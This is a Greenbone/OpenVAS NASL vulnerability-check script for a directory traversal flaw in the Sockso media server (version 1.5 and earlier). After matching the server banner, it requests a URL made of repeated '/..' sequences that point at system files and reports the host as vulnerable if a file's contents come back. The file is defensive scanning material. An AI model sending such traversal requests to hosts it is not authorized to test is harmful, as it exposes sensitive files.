if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802817" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_bugtraq_id( 52509 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-03-16 13:28:19 +0530 (Fri, 16 Mar 2012)" );
	script_name( "Sockso Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/18605/" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/52509/info" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/110828/sockso_1-adv.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_dependencies( "gb_get_http_banner.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 4444 );
	script_mandatory_keys( "Sockso/banner" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to obtain sensitive information
  that could aid in further attacks." );
	script_tag( name: "affected", value: "Sockso version 1.5 and prior" );
	script_tag( name: "insight", value: "The flaw is due to improper validation of URI containing '../' or
  '..\\' sequences, which allows attackers to read arbitrary files via directory
  traversal attacks." );
	script_tag( name: "solution", value: "Upgrade to Sockso version 1.5.1 or later." );
	script_tag( name: "summary", value: "The host is running Sockso and is prone to directory traversal
  vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "http://sockso.pu-gh.com/" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 4444 );
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( banner, "Server: Sockso" )){
	exit( 0 );
}
files = traversal_files();
for file in keys( files ) {
	url = NASLString( crap( data: "/..", length: 49 ), files[file] );
	if(http_vuln_check( port: port, url: "/file" + url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

